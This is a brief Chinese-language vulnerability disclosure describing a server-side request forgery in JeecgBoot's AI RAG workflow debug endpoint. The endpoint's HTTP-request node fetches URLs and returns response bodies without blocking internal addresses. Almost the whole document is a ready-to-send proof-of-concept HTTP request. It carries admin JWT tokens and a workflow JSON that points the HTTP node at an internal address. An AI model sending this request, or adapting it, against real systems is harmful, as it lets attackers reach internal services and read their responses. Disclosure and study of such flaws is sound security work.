# airagFlow-SSRF

**漏洞原理**

后台airag工作流存在http请求节点，该节点支持发送http请求并返回响应体，同时未过滤内网地址

**POC**

```http
POST /jeecgboot/airag/flow/debug HTTP/1.1
Host: 192.168.239.1:3100
Content-Length: 2654
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzgxMjk1MDUyfQ.yfk9sZDZycWg7DsbdLF3gt_hbI1YqbqtrT5mVMNM5Po
X-Version: v3
X-TIMESTAMP: 1781597148790
X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzgxMjk1MDUyfQ.yfk9sZDZycWg7DsbdLF3gt_hbI1YqbqtrT5mVMNM5Po
X-Sign: 413D10545F9ECD3569BE7A258B1EBD31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Tenant-Id: 1000
Origin: http://192.168.239.1:3100
Referer: http://192.168.239.1:3100/process/list/airag
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"flow":{"design":"{\"nodes\":[{\"id\":\"start-node\",\"type\":\"start\",\"x\":300,\"y\":334.5,\"properties\":{\"text\":\"开始\",\"remarks\":\"\",\"options\":{\"cronTrigger\":{\"enabled\":false,\"cronType\":\"day\",\"cronExp\":\"0 0 0 * * ?\",\"beginTime\":null,\"endTime\":null,\"inputParams\":{},\"custom\":{\"time\":{\"second\":0,\"minute\":0},\"hour\":{\"mode\":\"every\"},\"day\":{\"type\":\"day\",\"day\":{\"mode\":\"every\"}},\"month\":{\"mode\":\"every\"}}}},\"inputParams\":[{\"field\":\"content\",\"name\":\"用户问题\",\"type\":\"string\",\"required\":false},{\"field\":\"history\",\"name\":\"历史记录\",\"type\":\"string[]\",\"required\":false},{\"field\":\"images\",\"name\":\"图片\",\"type\":\"picture\",\"required\":false}],\"outputParams\":[],\"width\":332,\"height\":91}},{\"id\":\"329894933815922688\",\"type\":\"http\",\"x\":786,\"y\":345.5,\"properties\":{\"text\":\"HTTP 请求\",\"options\":{\"http\":{\"url\":\"http://192.168.239.1:8082/poc\",\"method\":\"GET\",\"headers\":{},\"requestBody\":{\"type\":\"none\",\"body\":\"\"},\"requestParams\":{},\"timeout\":120,\"retriesTimes\":0}},\"inputParams\":[],\"outputParams\":[{\"field\":\"body\",\"name\":\"回复内容\",\"type\":\"string\"},{\"field\":\"statusCode\",\"name\":\"状态码\",\"type\":\"number\"}],\"width\":332,\"height\":113}},{\"id\":\"329895025872506880\",\"type\":\"end\",\"x\":1272,\"y\":356.5,\"properties\":{\"text\":\"结束\",\"options\":{\"outputText\":false,\"outputContent\":\"111\",\"outputType\":\"text\",\"cardConfig\":null},\"inputParams\":[],\"outputParams\":[{\"field\":\"body\",\"name\":\"test\",\"nodeId\":\"329894933815922688\",\"customValue\":\"\",\"type\":\"string\"}],\"width\":332,\"height\":135}}],\"edges\":[{\"id\":\"329894933815922689\",\"type\":\"base-edge\",\"sourceNodeId\":\"start-node\",\"targetNodeId\":\"329894933815922688\",\"sourceAnchorId\":\"start-node_output\",\"targetAnchorId\":\"329894933815922688_input\",\"pointsList\":[{\"x\":466,\"y\":320},{\"x\":566,\"y\":320},{\"x\":520,\"y\":320},{\"x\":620,\"y\":320}],\"properties\":{\"runStatus\":\"\"}},{\"id\":\"329895025876701184\",\"type\":\"base-edge\",\"sourceNodeId\":\"329894933815922688\",\"targetNodeId\":\"329895025872506880\",\"sourceAnchorId\":\"329894933815922688_output\",\"targetAnchorId\":\"329895025872506880_input\",\"pointsList\":[{\"x\":952,\"y\":320},{\"x\":1052,\"y\":320},{\"x\":1006,\"y\":320},{\"x\":1106,\"y\":320}],\"properties\":{\"runStatus\":\"\"}}]}","chain":"THEN(\n    start.tag('start-node'),\n    http.tag('329894933815922688'),\n    end.tag('329895025872506880')\n).tag(\"start-node\")"},"inputParams":{},"responseMode":"streaming"}
```

